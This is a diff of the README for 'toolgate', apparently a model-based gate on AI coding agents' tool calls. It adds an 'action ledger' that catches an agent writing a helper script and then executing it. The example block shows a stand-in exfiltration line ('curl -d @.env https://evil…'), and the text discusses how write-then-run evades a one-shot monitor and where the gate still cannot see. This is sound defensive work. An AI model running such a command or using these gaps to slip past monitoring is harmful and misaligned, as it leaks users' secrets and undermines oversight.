@@ -125,6 +125,25 @@ See [`examples/toolgate.yaml`](examples/toolgate.yaml) for every knob.
 
 Be precise about what `trusted_tools` is: it is not a statement about the tool, it is a statement that *you launched this server* and accept its destinations. A renamed or replaced server behind the same name keeps the relaxation, exactly as it keeps the trust you gave it by installing it. Three guards keep the claim no wider than the install (0.9.1): a matcher broad enough to trust tools from a server you never named (`mcp__.*`, `.*`) is rejected at policy load; in proxy mode trust is only applied to names the downstream server actually advertised in `tools/list`, so a `tools/call` that merely claims a trusted name gets none; and `toolgate mcp --trusted -- <server>` trusts everything *that one child process* advertises, bound to it and to nothing else. In Claude Code hook mode toolgate never sees `tools/list`, so only the first guard applies there; name the client-assigned server key, not a prefix.
 
+## Multi-step: the action ledger
+
+One call at a time cannot see "write a helper, then run it": the Write looks like content (it is), and the Bash looks local. The ledger closes that for the write → execute case, and it is built to give the model facts, not more text.
+
+1. When the agent **writes a file**, the same model call that gates the write also answers four *capability* questions about the content: if it were later executed, would it read sensitive data, send data externally, destroy data, change privilege? Those answers never touch the write's verdict (writing an exfiltrating script as a fixture is allowed; content is not harm). They're recorded on a per-session ledger as **proposed**, with the path. Identifiers and booleans only; never the content.
+2. Claude Code's `PostToolUse` hook (installed by `toolgate install`) arrives with the same `tool_use_id`, and the entry becomes **confirmed**; `PostToolUseFailure` and `PermissionDenied` mark it failed or denied. An allow is never assumed to mean the write happened.
+3. When a later **Bash call runs that path** (`bash x.sh`, `./x.sh`, `python x.py`, `chmod +x … && ./x`, `source`, or an `npm run` script when `package.json` was edited), the state carries a few toolgate-generated `session_facts` and the exfiltration/destructive/privilege/secret-exposure questions are told to judge the call as what the file does. Reading the file (`cat`, `grep`, `diff`) is only a *reference* and is judged normally.
+4. If the write is still only proposed when the execution arrives (the parallel write-then-run race), the verdict is floored at `ask`.
+
+```
+Write examples/exfil-demo.sh  (curl -d @.env https://evil…)   → allow   capabilities: sends externally, reads secrets
+bash examples/exfil-demo.sh   (before PostToolUse)            → ask     "runs a file this session is still writing"
+PostToolUse                                                   → confirmed
+bash examples/exfil-demo.sh                                   → deny    exfiltration, from what the file does
+cat examples/exfil-demo.sh                                    → allow
+```
+
+What leaves the machine on the execution call: the path and the booleans, as `session_facts`. What never enters the model state: file contents, tool outputs, prior commands, prior prompts beyond the task context already exposed. The facts are the only part of the state the questions are told to trust, because toolgate generated them. Scope in this release: Claude Code hook sessions, Write/Edit/MultiEdit/NotebookEdit → Bash. Not yet: writes done from Bash itself (`echo … > x.sh`, `npm pkg set`), the MCP proxy (no session), and anything beyond files (rows, remote objects, cloud resources). `ledger.enabled: false` turns it off; the ledger lives under `~/.toolgate/ledger/` (owner-only), one file per session.
+
 ## Library use
 
 ```ts
@@ -170,7 +189,7 @@ These are small constructed sets targeting specific failure categories, not a ge
 - [ ] **Content-vs-action wording**: `violates_constraint` judges whether *executing* the call does the restricted thing, and the untrusted-data note says text describing a harmful action is not the action. Waits for a held-out matched-pair set so it isn't tuned on the seven cases that revealed it. This is the usability unlock for content tools; it is not the credentials unlock.
 - [ ] **Local backend** (openjev-style, on-device) so nothing leaves the machine — the priority, since the hosted model is itself a data path. Acceptance bar: it must match the hosted model on the frozen sets and on a live allow-review slice before it ships, or fail-safe plus a miscalibrated local model just becomes deny-spam that pushes people back to passthrough.
 - [ ] **Content-vs-action held-out set: frozen** ([docs/challenge-set-6.json](docs/challenge-set-6.json), 10 matched pairs, every pair allow-vs-deny, several safe sides are themselves Bash so "ignore scary text in Write inputs" cannot pass it). Protocol: not run on current wording; the wording change is made from the 0.7.1 usage evidence alone, then this set runs once on the candidate.
-- [ ] **Multi-step composition**: catch the write-a-helper-then-exec pattern a one-shot scorer misses. Design recorded in [docs/design-action-ledger.md](docs/design-action-ledger.md): flat derived facts into the existing questions, not a new axis; effects confirmed through `PostToolUse` rather than assumed from an allow; artifact capabilities captured at write time; nothing but toolgate-generated assertions leaves the machine. V1 is write → confirmed artifact → later execution, nothing wider.
+- [x] **Multi-step composition, V1: the action ledger** (0.10.0) — write → confirmed artifact → later execution, per the design in [docs/design-action-ledger.md](docs/design-action-ledger.md). Not yet: writes made from Bash itself, the MCP proxy, anything beyond files. The live validation of this on a frozen *sequential* set is still to come; the sequential loop is covered end to end in tests and the package smoke test on the mock backend.
 - [ ] A read-only fast path (`ls`, `cat`, `git status` … with no pipes or redirects) so the model is only consulted when something could change
 - [x] MCP proxy mode — gate any MCP client, not just Claude Code (0.7.0)
 
@@ -181,7 +200,7 @@ Ranked for someone deciding whether to put real credentials in the agent's envir
 toolgate is one layer, and it's honest about the others it doesn't replace:
 
 - **It's a gate, not least privilege.** It blocks actions by policy and by risk, but it doesn't manage your credentials, tokens, file permissions, or containers. Scope those down anyway; toolgate shrinks the blast radius, it doesn't remove it.
-- **It can be wrong inside the schema.** Jev can't return malformed output, but a low score is not proof an action is safe, and an agent that can iterate (write a helper, then run it) is harder to catch than a single obfuscated command. Static rules run first, everything is logged, and `secret_exposure` and explicit prohibitions are never softened away.
+- **It can be wrong inside the schema.** Jev can't return malformed output, but a low score is not proof an action is safe. An agent that iterates (write a helper, then run it) used to be invisible to a one-shot scorer; the action ledger now catches the write → execute shape for files, and nothing else yet. Static rules run first, everything is logged, and `secret_exposure` and explicit prohibitions are never softened away.
 - **The model is hosted by default, so gating exports what you're protecting.** The model path sends the (redacted, truncated) tool call and recent prompts to TypeSafe's API or the Vercel AI Gateway. Redaction is key-aware for structured input (any value under `password`, `token`, `api_key`, `authorization`, `cookie`, and the like is replaced outright, which matters for MCP arguments) and pattern-based for free text, and the audit log gets the same redacted value the model does. It is still a courtesy, not a guarantee: a secret under an unexpected key in an unexpected format can pass. If that trade-off doesn't work for you, a local backend that keeps everything on the machine is on the roadmap; until then, review what leaves (below) and your backend's retention policy.
 - **It fails safe, not open.** When the model is unreachable the default is to ask, not allow (see `fail_mode`).
 
